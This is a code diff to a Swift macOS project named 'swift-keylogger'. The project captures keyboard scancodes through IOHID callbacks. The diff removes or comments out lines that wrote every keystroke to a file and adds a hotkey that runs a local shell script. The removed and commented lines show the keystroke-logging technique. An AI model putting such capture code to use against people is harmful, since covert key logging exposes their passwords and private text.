@@ -14,6 +14,8 @@ class CallBackFunctions
     static var CAPSLOCK = false
     static var calander = Calendar.current
     static var prev = ""
+    static var KEY = 129
+    static var SH_PATH = "/Users/mt/project/swift-keylogger/makeandroid.sh"
     
     static let Handle_DeviceMatchingCallback: IOHIDDeviceCallback = { context, result, sender, device in
         
@@ -132,6 +134,7 @@ class CallBackFunctions
         }
 Outside:if pressed == 1
         {
+            print("scancode  %d", scancode)
             if scancode == 57
             {
                 CallBackFunctions.CAPSLOCK = !CallBackFunctions.CAPSLOCK
@@ -139,35 +142,24 @@ Outside:if pressed == 1
             }
             if scancode >= 224 && scancode <= 231
             {
-                fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
+                //fh?.write( (mySelf.keyMap[scancode]![0] + "(").data(using: .utf8)!)
                 break Outside
-            }
-            if CallBackFunctions.CAPSLOCK
-            {
-                fh?.write(mySelf.keyMap[scancode]![1].data(using: .utf8)!)
             }
             else
             {
-                if scancode == 101
+                if scancode == KEY
                 {
                     //let appPath = "/Applications/iTerm.app"
                     //NSWorkspace.shared.openFile(appPath)
                     
                     let task = Process()
-                    task.launchPath = "/Users/mt/Desktop/test.sh"
+                    task.launchPath = SH_PATH
                     task.launch()
                     task.waitUntilExit()
                     
                     break Outside
                 }
-                fh?.write(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
-            }
-        }
-        else
-        {
-            if scancode >= 224 && scancode <= 231
-            {
-                fh?.write(")".data(using: .utf8)!)
+                //fh?.write(mySelf.keyMap[scancode]![0].data(using: .utf8)!)
             }
         }
     }
